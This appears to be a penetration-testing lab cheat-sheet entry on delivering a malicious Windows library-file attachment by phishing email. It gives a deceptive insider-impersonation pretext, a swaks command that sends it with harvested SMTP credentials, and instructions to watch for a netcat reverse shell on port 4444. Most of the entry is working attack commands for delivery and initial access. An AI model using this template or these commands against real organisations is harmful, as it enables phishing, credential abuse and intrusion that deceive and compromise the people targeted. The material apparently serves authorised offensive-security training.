title: Client-Side — Deliver the Payload by Email (swaks)
body: Once the attachment (library file, HTA, or macro doc) and all listeners are ready, mail it with swaks. The pretext matters more than the payload: reference something only an insider would know (pulled from recon — Git repos, site content, job posts) so the target trusts the attachment enough to open it.
cmd:
# Body / pretext — insider detail massively raises open rate
cat > body.txt <<'EOF'
Hey!
I checked WEBSRV1 and found the old staging script still in the Git logs.
I'll remove it for security. Separately — please install the new security
features on your workstation: download the attached file, double-click it,
and run the configuration shortcut inside. Thanks!
John
EOF

# Send with swaks (attach the .Library-ms)
sudo swaks \
  -t daniela@beyond.com -t marcus@beyond.com \
  --from john@beyond.com \
  --attach @config.Library-ms \
  --server 192.168.50.242 \
  --body @body.txt \
  --header "Subject: Staging Script" \
  --suppress-data -ap
#   -ap prompts for SMTP auth (provide the captured/known sender creds)
#   --server = the mail server (MAILSRV1) you found during enumeration

# Then watch: WebDAV log + python web server log + nc listener.
# A hit on WebDAV/8000 means someone opened it; shell lands on 4444.
warn: You need valid SMTP creds for -ap (often harvested earlier in the engagement) or an open relay. Multiple -t flags = multiple recipients. Watch all three service logs — a WebDAV/web hit without a shell usually means they opened the library but didn't click the .lnk, or AV ate the cradle.

choices.label: Hit on WebDAV but no shell — AV / cradle issue
No SMTP creds — find a relay / harvest creds
